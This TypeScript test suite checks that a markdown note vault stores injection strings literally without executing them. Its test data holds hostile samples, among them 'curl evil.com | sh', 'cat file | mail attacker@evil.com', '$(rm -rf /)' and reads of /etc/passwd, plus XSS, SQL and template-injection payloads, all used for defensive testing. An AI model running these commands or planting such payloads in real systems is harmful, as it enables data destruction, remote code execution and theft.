/**
 * Security tests for injection attack prevention
 *
 * Validates protection against:
 * - YAML injection in frontmatter (code execution patterns)
 * - Markdown code block escape attempts
 * - Shell command injection via git commit messages
 * - Template injection in policy YAML
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import {
  createTempVault,
  cleanupTempVault,
  createTestNote,
  readTestNote,
} from '../helpers/testUtils.js';
import matter from 'gray-matter';

describe('Injection Attack Prevention', () => {
  let tempVault: string;

  beforeEach(async () => {
    tempVault = await createTempVault();
  });

  afterEach(async () => {
    await cleanupTempVault(tempVault);
  });

  // ========================================
  // YAML Injection in Frontmatter
  // ========================================

  describe('YAML injection in frontmatter', () => {
    it('should safely parse frontmatter with JavaScript code patterns', async () => {
      // YAML could potentially be exploited with code execution
      // gray-matter should safely parse without executing
      const content = `---
title: Test
script: "function() { return 'injected'; }"
---
# Test Note

Content here
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');
      const parsed = matter(result);

      // Should parse as string, not execute
      expect(typeof parsed.data.script).toBe('string');
      expect(parsed.data.script).toContain('function');
    });

    it('should handle YAML constructor injection attempts', async () => {
      // !!js/function is a known YAML attack vector
      // gray-matter with safe mode should reject these
      const content = `---
title: Test
dangerous: !!js/function 'function() { return process.env; }'
---
# Test Note
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // gray-matter uses js-yaml in safe mode by default
      // This should either fail to parse (throw) or treat as string
      // Throwing is actually the secure behavior - it prevents execution
      let parsed;
      let threwException = false;
      try {
        parsed = matter(result);
      } catch {
        threwException = true;
      }
      // Either: exception was thrown (safe) OR dangerous field is not a function (safe)
      expect(threwException || typeof parsed?.data?.dangerous !== 'function').toBe(true);
    });

    it('should handle YAML merge key injection', async () => {
      // Merge keys (<<:) could be used to inject unexpected values
      const content = `---
defaults: &defaults
  adapter: postgres
  host: localhost
development:
  <<: *defaults
  database: dev_db
---
# Test Note
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');
      const parsed = matter(result);

      // Should parse normally - merge keys are valid YAML
      expect(parsed.data.development).toBeDefined();
    });

    it('should handle billion laughs attack (exponential entity expansion)', async () => {
      // YAML allows entity references that can cause exponential expansion
      // However, markdown frontmatter typically doesn't use XML-style entities
      const content = `---
title: Test
a: &a "lol"
b: &b [*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b]
---
# Test Note
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Should parse without hanging or memory exhaustion
      const parsed = matter(result);
      expect(parsed.data.a).toBe('lol');
    });

    it('should handle null byte in YAML values', async () => {
      const content = `---
title: Test\x00Truncated
tags:
  - normal
  - "with\x00null"
---
# Test Note
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Should handle gracefully - either parse (with sanitized data) or throw
      // Both behaviors are acceptable from a security perspective
      let parsed;
      let threwException = false;
      try {
        parsed = matter(result);
      } catch {
        threwException = true;
      }
      // Either exception (null bytes rejected) or parsed successfully
      expect(threwException || parsed !== undefined).toBe(true);
    });

    it('should handle YAML with environment variable patterns', async () => {
      // ${VAR} patterns should not expand environment variables
      const content = `---
title: Test
password: \${PASSWORD}
secret: \${AWS_SECRET_KEY}
home: \${HOME}
---
# Test Note
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');
      const parsed = matter(result);

      // Should be literal strings, not expanded
      expect(parsed.data.password).toBe('${PASSWORD}');
      expect(parsed.data.secret).toBe('${AWS_SECRET_KEY}');
      expect(parsed.data.home).toBe('${HOME}');
    });
  });

  // ========================================
  // Markdown Code Block Escape
  // ========================================

  describe('Markdown code block escape attempts', () => {
    it('should handle content with code fence characters', async () => {
      const content = `---
title: Test
---
# Test Note

## Log

\`\`\`javascript
console.log("safe code");
\`\`\`

Normal content
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Code block should be preserved
      expect(result).toContain('```javascript');
      expect(result).toContain('console.log');
      expect(result).toContain('```');
    });

    it('should handle nested code fences (fence within fence)', async () => {
      const content = `---
title: Test
---
# Test Note

\`\`\`\`markdown
Here is an example:
\`\`\`javascript
code
\`\`\`
\`\`\`\`
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Four-backtick fence should contain three-backtick fence
      expect(result).toContain('````');
    });

    it('should handle unclosed code fences', async () => {
      const content = `---
title: Test
---
# Test Note

\`\`\`javascript
// This code block is never closed
function escape() {}

## This heading might look like it's outside the code block
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Should preserve content as-is
      expect(result).toContain('```javascript');
      expect(result).toContain('## This heading');
    });

    it('should handle code fences with injection-like info strings', async () => {
      const content = `---
title: Test
---
# Test Note

\`\`\`javascript|INJECT
safe code
\`\`\`

\`\`\`bash $(whoami)
echo "test"
\`\`\`
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Info strings should be preserved literally
      expect(result).toContain('```javascript|INJECT');
      expect(result).toContain('```bash $(whoami)');
    });
  });

  // ========================================
  // Shell Command Injection Patterns
  // ========================================

  describe('Shell command injection patterns in content', () => {
    it('should store command substitution patterns literally', async () => {
      // These patterns could be dangerous if passed to shell
      const content = `---
title: Test
---
# Test Note

## Log

- Task: \$(rm -rf /)
- Note: \`whoami\`
- Reference: $(cat /etc/passwd)
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Should be stored as literal text, not executed
      expect(result).toContain('$(rm -rf /)');
      expect(result).toContain('`whoami`');
      expect(result).toContain('$(cat /etc/passwd)');
    });

    it('should handle semicolon command chaining patterns', async () => {
      const content = `---
title: Test
---
# Test Note

filename: test; rm -rf /
path: /safe; curl evil.com | sh
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Should be stored literally
      expect(result).toContain('test; rm -rf /');
      expect(result).toContain('curl evil.com | sh');
    });

    it('should handle pipe command patterns', async () => {
      const content = `---
title: Test
---
# Test Note

command: cat file | mail attacker@evil.com
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      expect(result).toContain('cat file | mail attacker@evil.com');
    });

    it('should handle backtick command execution patterns', async () => {
      const content = `---
title: Test
command: \`id\`
---
# Test Note

Run: \`whoami\`
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Backticks in YAML may cause parse errors or be treated as strings
      // Both are acceptable from a security perspective (not executed)
      let parsed;
      let threwException = false;
      try {
        parsed = matter(result);
      } catch {
        threwException = true;
      }
      // Either exception (rejected) or parsed as string (not executed)
      expect(threwException || typeof parsed?.data?.command === 'string').toBe(true);
    });
  });

  // ========================================
  // Template Injection Patterns
  // ========================================

  describe('Template injection patterns', () => {
    it('should handle Jinja/Nunjucks template syntax', async () => {
      const content = `---
title: Test
---
# Test Note

{{ config.SECRET_KEY }}
{% for item in items %}{{ item }}{% endfor %}
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Template syntax should be preserved as literal text
      expect(result).toContain('{{ config.SECRET_KEY }}');
      expect(result).toContain('{% for item in items %}');
    });

    it('should handle EJS template syntax', async () => {
      const content = `---
title: Test
---
# Test Note

<%= process.env.SECRET %>
<% if (admin) { %>Admin content<% } %>
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      expect(result).toContain('<%= process.env.SECRET %>');
      expect(result).toContain('<% if (admin)');
    });

    it('should handle Handlebars/Mustache template syntax', async () => {
      const content = `---
title: Test
---
# Test Note

{{#each users}}
  {{this.password}}
{{/each}}
{{{rawHtml}}}
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      expect(result).toContain('{{#each users}}');
      expect(result).toContain('{{this.password}}');
      expect(result).toContain('{{{rawHtml}}}');
    });

    it('should handle Python format string patterns', async () => {
      const content = `---
title: Test
---
# Test Note

{0.__class__.__mro__[1].__subclasses__()}
{config.__class__.__init__.__globals__}
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Python format string injection patterns should be literal
      expect(result).toContain('{0.__class__.__mro__[1].__subclasses__()}');
    });
  });

  // ========================================
  // XSS-like Patterns (for web rendering)
  // ========================================

  describe('XSS-like patterns in markdown', () => {
    it('should preserve script tags as content', async () => {
      const content = `---
title: Test
---
# Test Note

<script>alert('xss')</script>
<img src=x onerror="alert('xss')">
<a href="javascript:alert('xss')">click</a>
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // XSS patterns should be preserved (markdown parser/renderer handles sanitization)
      expect(result).toContain('<script>alert');
      expect(result).toContain('onerror="alert');
      expect(result).toContain('javascript:alert');
    });

    it('should preserve data URIs', async () => {
      const content = `---
title: Test
---
# Test Note

![](data:text/html,<script>alert('xss')</script>)
<a href="data:text/html,<script>alert('xss')</script>">link</a>
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      expect(result).toContain('data:text/html');
    });

    it('should preserve SVG injection patterns', async () => {
      const content = `---
title: Test
---
# Test Note

<svg onload="alert('xss')">
  <animate attributeName="href" values="javascript:alert('xss')"/>
</svg>
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      expect(result).toContain('<svg onload');
    });
  });

  // ========================================
  // SQL Injection Patterns (for content storage)
  // ========================================

  describe('SQL injection patterns in content', () => {
    it('should store SQL injection patterns literally', async () => {
      const content = `---
title: "'; DROP TABLE notes; --"
---
# Test Note

Query: SELECT * FROM users WHERE id = '1' OR '1'='1'
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');
      const parsed = matter(result);

      // SQL patterns should be literal strings
      expect(parsed.data.title).toBe("'; DROP TABLE notes; --");
      expect(result).toContain("OR '1'='1'");
    });

    it('should handle UNION-based injection patterns', async () => {
      const content = `---
title: Test
---
# Test Note

' UNION SELECT password FROM users --
' UNION ALL SELECT NULL,NULL,@@version --
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      expect(result).toContain("UNION SELECT password");
    });
  });

  // ========================================
  // Path Injection in Content
  // ========================================

  describe('Path injection patterns in content', () => {
    it('should store wikilinks with traversal patterns literally', async () => {
      const content = `---
title: Test
---
# Test Note

Link: [[../../../etc/passwd]]
Link: [[..\\..\\Windows\\System32]]
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Wikilinks should be preserved as-is (link resolution is separate)
      expect(result).toContain('[[../../../etc/passwd]]');
    });

    it('should handle file protocol URLs', async () => {
      const content = `---
title: Test
---
# Test Note

[secret](file:///etc/passwd)
![image](file:///C:/Windows/System32/config/SAM)
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      expect(result).toContain('file:///etc/passwd');
    });
  });

  // ========================================
  // LDAP Injection Patterns
  // ========================================

  describe('LDAP injection patterns in content', () => {
    it('should store LDAP injection patterns literally', async () => {
      const content = `---
title: Test
---
# Test Note

Search: *)(uid=*))(|(uid=*
Filter: )(cn=*)(|(password=*)
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      expect(result).toContain('*)(uid=*))(|(uid=*');
    });
  });

  // ========================================
  // Regex Injection Patterns
  // ========================================

  describe('Regex injection patterns', () => {
    it('should handle ReDoS patterns in content', async () => {
      // These patterns could cause exponential backtracking if used in regex
      const content = `---
title: Test
---
# Test Note

Pattern: (a+)+$
Evil: ((a+)+)+$
Nested: (([a-zA-Z]+)*)*
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Should be stored literally
      expect(result).toContain('(a+)+$');
      expect(result).toContain('((a+)+)+$');
    });
  });

  // ========================================
  // Unicode Injection
  // ========================================

  describe('Unicode-based injection', () => {
    it('should handle right-to-left override characters', async () => {
      // RLO (U+202E) can be used to disguise file extensions
      const content = `---
title: Test
---
# Test Note

Filename: invoice\u202Efdp.exe
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Should preserve the RLO character
      expect(result).toContain('\u202E');
    });

    it('should handle zero-width characters', async () => {
      // ZWSP, ZWNJ, ZWJ can be used to hide content
      const content = `---
title: Test
---
# Test Note

Hidden: pass\u200Bword
Joined: te\u200Dst
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      // Should preserve zero-width characters
      expect(result).toContain('\u200B');
    });

    it('should handle homoglyph attacks', async () => {
      // Cyrillic 'а' (U+0430) looks like Latin 'a'
      const content = `---
title: Test
---
# Test Note

Fаke (Cyrillic а): password = "secret"
`;
      await createTestNote(tempVault, 'test.md', content);
      const result = await readTestNote(tempVault, 'test.md');

      expect(result).toContain('Fаke');
    });
  });
});
